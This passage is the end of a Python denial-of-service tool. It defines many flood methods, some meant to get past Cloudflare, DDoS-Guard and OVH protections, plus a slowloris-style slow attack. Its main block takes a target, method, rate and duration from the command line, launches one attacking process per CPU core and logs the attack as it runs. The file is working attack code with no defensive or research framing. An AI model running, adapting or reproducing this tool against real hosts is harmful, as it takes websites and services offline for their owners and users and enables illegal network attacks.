            "Accept-Encoding: gzip,deflate,br\r\n"
            "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9),
                                          ProxyTools.Random.rand_str(4)) +
            "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n")
        s = None
        with suppress(Exception), self.my_open_connection(target) as s:
            Tools.send(s, p1)
            Tools.send(s, p2)
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def OVH(self, payload) -> None:
        s = None
        with suppress(Exception), self.my_open_connection(target) as s:
            for _ in range(min(self._rpc, 5)):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def CFB(self, payload):
        global REQUESTS_SENT, BYTES_SEND
        s = None
        with suppress(Exception), create_scraper() as s:
            for _ in range(self._rpc):
                with s.get(self._target.human_repr()) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def CFBUAM(self, payload):
        s = None
        with suppress(Exception), self.my_open_connection(target) as s:
            Tools.send(s, payload)
            sleep(5.01)
            ts = time()
            for _ in range(self._rpc):
                Tools.send(s, payload)
                if time() > ts + 120: break
        Tools.safe_close(s)

    def AVB(self, payload):
        s = None
        with suppress(Exception), self.my_open_connection(target) as s:
            for _ in range(self._rpc):
                sleep(max(self._rpc / 1000, 1))
                Tools.send(s, payload)
        Tools.safe_close(s)

    def DGB(self, payload):
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception):
            with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents)) as ss:
                for _ in range(min(self._rpc, 5)):
                    sleep(min(self._rpc, 5) / 100)
                    with ss.get(self._target.human_repr()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        continue

                Tools.safe_close(ss)

            with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents)) as ss:
                for _ in range(min(self._rpc, 5)):
                    sleep(min(self._rpc, 5) / 100)
                    with ss.get(self._target.human_repr()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)

            Tools.safe_close(ss)

    def DYN(self, payload):
        s = None
        with suppress(Exception), self.my_open_connection(target) as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def DOWNLOADER(self, payload):
        s = None
        with suppress(Exception), self.my_open_connection(target) as s:
            for _ in range(self._rpc):
                Tools.sendto(s, payload, self._raw_target)
                while 1:
                    sleep(.01)
                    data = s.recv(1)
                    if not data:
                        break
            Tools.sendto(s, b'0', self._raw_target)
        Tools.safe_close(s)

    def BYPASS(self, payload):
        global REQUESTS_SENT, BYTES_SEND
        s = None
        with suppress(Exception), Session() as s:
            for _ in range(self._rpc):
                with s.get(self._target.human_repr()) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
                    continue
        Tools.safe_close(s)

    def GSB(self, payload):
        s = None
        with suppress(Exception), self.my_open_connection(target) as s:
            for _ in range(self._rpc):
                Tools.sendto(s, payload, self._raw_target)
        Tools.safe_close(s)

    def RHEX(self, payload):
        s = None
        with suppress(Exception), self.my_open_connection(target) as s:
            for _ in range(self._rpc):
                Tools.sendto(s, payload, self._raw_target)
        Tools.safe_close(s)

    def NULL(self, payload) -> None:
        s = None
        with suppress(Exception), self.my_open_connection(target) as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def SLOW(self, payload):
        s = None
        with suppress(Exception), self.my_open_connection(target) as s:
            for _ in range(self._rpc):
                Tools.sendto(s, payload, self._raw_target)
            while Tools.sendto(s, payload, self._raw_target) and s.recv(1):
                for i in range(self._rpc):
                    keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                    Tools.sendto(s, keep, self._raw_target)
                    sleep(self._rpc / 15)
                    break
        Tools.safe_close(s)


if __name__ == '__main__':
    with suppress(KeyboardInterrupt):
        with suppress(IndexError):
            one = argv[1].upper()
            method = one
            spoofing = argv[2].upper()
            host = None
            port = None
            url = None
            event = multiprocessing.Event()
            event.clear()
            target = None
            urlraw = argv[3].strip()
            if not urlraw.startswith("http"):
                urlraw = "http://" + urlraw

            if method not in Methods.ALL_METHODS:
                exit("Method Not Found %s" %
                     ", ".join(Methods.ALL_METHODS))

            if not checkRawSocket():
                    exit("Cannot Create Raw Socket")

            if method in Methods.LAYER7_METHODS:
                url = URL(urlraw)
                host = url.host

                try:
                    host = gethostbyname(url.host)
                except Exception as e:
                    exit('Cannot resolve hostname ', url.host, str(e))

                rpc = int(argv[4])
                timer = int(argv[5])
                useragent_li = Path(__dir__ / "files/useragent.txt")
                referers_li = Path(__dir__ / "files/referers.txt")

                BYTES_LIMIT = int(int(argv[6]) * 1000 * 1000 * 0.95)
                #BYTES_LIMIT = ctypes.c_int(BYTES_LIMIT)

                if len(argv) == 8:
                    logger.setLevel("DEBUG")

                if not useragent_li.exists():
                    exit("The Useragent file doesn't exist ")
                if not referers_li.exists():
                    exit("The Referer file doesn't exist ")

                uagents = set(a.strip()
                              for a in useragent_li.open("r+").readlines())
                referers = set(a.strip()
                               for a in referers_li.open("r+").readlines())

                #print("Target: ", url)
                #print("Host: ", host)
                #print("Raw_target: ", (host, url.port or 80))
                '''
                process = Layer7(url, host, method, rpc, spoofing, event,
                              uagents, referers)
                process.daemon = True
                process.start()
                '''
                
                for proc in range(os.cpu_count()):
                    process = Layer7(url, host, method, rpc, spoofing, event,
                              uagents, referers)
                    process.daemon = True
                    process.start()
                

            if method in Methods.LAYER4_METHODS:
                target = URL(urlraw)

                port = target.port
                target = target.host

                try:
                    target = gethostbyname(target)
                except Exception as e:
                    exit('Cannot resolve hostname ', url.host, e)

                if port > 65535 or port < 1:
                    exit("Invalid Port [Min: 1 / Max: 65535] ")

                timer = int(argv[4])

                if not port:
                    logger.warning("Port Not Selected, Set To Default: 80")
                    port = 80

                if method in {"SYN", "ICMP"}:
                    __ip__ = __ip__

                BYTES_LIMIT = int(int(argv[5]) * 1000 * 1000 * 0.95)

                if len(argv) == 7:
                    logger.setLevel("DEBUG")
                
                for _ in range(os.cpu_count()):
                    process = Layer4((target, port), method, event, spoofing)
                    process.daemon = True
                    process.start()

            if method in Methods.LAYER4_METHODS:
                logger.info(
                    f"Attack Started to %s:%s with %s method for %s seconds"
                    % (target or url.host, port or url.port, method, timer))
            elif method in Methods.LAYER7_METHODS:
                logger.info(
                    f"Attack Started to %s:%s with %s method for %s seconds, request per connection: %d!"
                    % (target or url.host, port or url.port, method, timer, rpc))
            event.set()
            ts = time()
            while time() < ts + timer:
                logger.debug(
                    f'Target: %s, Port: %s, Method: %s, PPS: %s, BPS: %s / %d%%' %
                    (target or url.host,
                     port or (url.port or 80),
                     method,
                     Tools.humanformat(int(REQUESTS_SENT)),
                     Tools.humanbytes(int(BYTES_SEND)),
                     round((time() - ts) / timer * 100, 2)))
                REQUESTS_SENT.set(0)
                BYTES_SEND.set(0)
                sleep(1)

            event.clear()
            exit()
            
